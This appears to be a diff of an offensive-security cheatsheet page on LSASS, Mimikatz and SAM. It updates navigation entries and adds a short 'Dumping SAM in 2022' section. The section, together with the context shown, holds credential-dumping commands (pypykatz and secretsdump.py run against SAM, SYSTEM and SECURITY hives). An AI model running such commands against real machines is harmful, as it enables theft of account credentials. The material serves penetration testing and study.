@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-01-31T14:36:11 CET">
+<meta name="revised" content="2022-09-11T16:52:52 CEST">
 <title>LSASS, Mimikatz, SAM :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1090,13 +1090,6 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/shells-methods/windows/" class="dd-item">
-        <div>
-          <a href="/shells-methods/windows/">
-            Windows Shells Methods
-          </a><i class="fa fa-circle-thin read-icon"></i>
-        </div>
-    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/" class="dd-item parent haschildren
@@ -1316,6 +1309,13 @@
         <div>
           <a href="/windows-systems/privilege-escalation/spoolerservice/">
             Spooler Service
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/specific_domain_groups/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/specific_domain_groups/">
+            Specific Domain Groups
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1783,6 +1783,7 @@
       <option value="/windows-systems/privilege-escalation/azure_ad/" >-- Azure AD</option>
       <option value="/windows-systems/privilege-escalation/amsi_and_evasion/" >-- AMSI Bypass and Evasion</option>
       <option value="/windows-systems/privilege-escalation/spoolerservice/" >-- Spooler Service</option>
+      <option value="/windows-systems/privilege-escalation/specific_domain_groups/" >-- Specific Domain Groups</option>
   
     <option value="/windows-systems/post-exploitation-techniques/" >
   - 
@@ -1940,6 +1941,14 @@ https://github.com/GossiTheDog/HiveNightmare
 
 <span style="color:#75715e"># Then, get creds</span>
 python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL</code></pre></div>
+<p><br/></p>
+
+<h3 id="dumping-sam-in-2022">Dumping SAM in 2022</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://twitter.com/mpgn_x64/status/1545506443696246785
+<span style="color:#75715e"># Tools like chntpw, bkhive, pwdump, samdump2 are not working on latest Windows 10</span>
+
+<span style="color:#75715e"># cd Windows/System32/config</span>
+<span style="color:#75715e"># pypykatz registry --sam SAM SYSTEM</span></code></pre></div>
 
     
     
